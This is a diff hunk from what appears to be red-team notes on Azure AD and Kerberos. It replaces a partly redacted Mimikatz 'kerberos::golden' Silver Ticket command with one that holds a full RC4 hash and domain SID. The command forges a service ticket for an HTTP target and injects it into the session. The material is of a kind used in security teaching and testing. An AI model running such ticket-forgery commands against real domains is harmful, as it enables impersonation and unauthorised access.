@@ -39,7 +39,7 @@ In order to do so, the following parameters are required:
 
 **Having this information we can now create and use the Silver Ticket on any Windows computer connected to the internet Service**
 ```
-kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:db[...]59 /sid:S-1-5-21-805388781-1469664503-1626361301-1106 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
+kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:f9969e088b2c13d93833d0ce436c76dd /sid:S-1-5-21-2121516926-2695613149-3163776784 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
 ```
 # References
 * [AZURE AD INTRODUCTION FOR RED TEAMERS](https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html)
